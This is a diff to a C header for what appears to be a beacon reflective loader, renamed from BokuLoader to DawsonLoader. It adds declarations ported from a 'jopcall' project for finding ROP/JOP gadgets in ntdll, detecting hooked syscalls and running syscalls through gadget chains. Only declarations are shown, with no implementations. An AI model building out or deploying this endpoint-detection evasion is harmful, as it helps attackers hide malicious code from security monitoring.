@@ -75,6 +75,47 @@ typedef struct Section {
     DWORD Characteristics;
 }Section;
 
+// ========== JOPCALL INTEGRATION - NEW STRUCTURES ==========
+
+#define MAX_GADGETS 12
+#define MAX_GADGET_CHAIN 5
+#define SECTION_MEM_EXECUTE 0x20000000
+
+// Memory section structure for gadget scanning (ported from jopcall/src/jop.rs:11)
+typedef struct MemorySection {
+    DWORD virtual_size;
+    PVOID address;
+    DWORD characteristics;
+} MemorySection, *PMemorySection;
+
+// ROP/JOP Gadget chain structure
+typedef struct GadgetChain {
+    PVOID gadgets[MAX_GADGET_CHAIN];  // Array of gadget addresses
+    DWORD count;                       // Number of gadgets in chain
+} GadgetChain, *PGadgetChain;
+
+// Syscall information structure (ported from jopcall/src/syscall.rs:12)
+typedef struct SyscallInfo {
+    WORD ssn;              // System Service Number
+    PVOID address;         // Address of syscall instruction
+    BOOL hooked;           // Whether syscall is hooked
+} SyscallInfo, *PSyscallInfo;
+
+// ========== JOPCALL INTEGRATION - FUNCTION DECLARATIONS ==========
+
+// Gadget discovery functions (ported from jopcall/src/jop.rs)
+DWORD get_image_memory_sections(PVOID dll_base_address, MemorySection* section_buffer, DWORD max_sections);
+DWORD search_gadget(BYTE* gadget_asm, DWORD gadget_size, MemorySection* section_list, DWORD section_count, PVOID* gadget_buffer, DWORD max_gadgets);
+BOOL find_rop_gadgets(Dll* ntdll_module, GadgetChain* chain);
+
+// Helper functions (ported from jopcall/src/helper.rs)
+DWORD search_bytes(BYTE* pattern, DWORD pattern_len, BYTE* source, DWORD source_len);
+PVOID pick_random_gadget(PVOID* gadget_array, DWORD gadget_count);
+DWORD pseudorandom();
+
+// ROP-based syscall execution (ported from jopcall/src/syscall.rs:181)
+extern LONG32 NTAPI jop_syscall(PVOID* gadget_list, WORD gadget_count, WORD ssn, PVOID syscall_addr, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5);
+
 #if !defined(NTSTATUS)
 typedef LONG NTSTATUS;
 typedef NTSTATUS *PNTSTATUS;
@@ -258,7 +299,7 @@ typedef enum _MEMORY_INFORMATION_CLASS {
 
 
 PVOID Setup();
-PVOID BokuLoader();
+PVOID DawsonLoader();
 VOID checkObfuscate(Dll * raw_beacon_dll_struct);
 VOID checkUseRWX(Dll * raw_beacon_dll_struct);
 PVOID returnRDI();
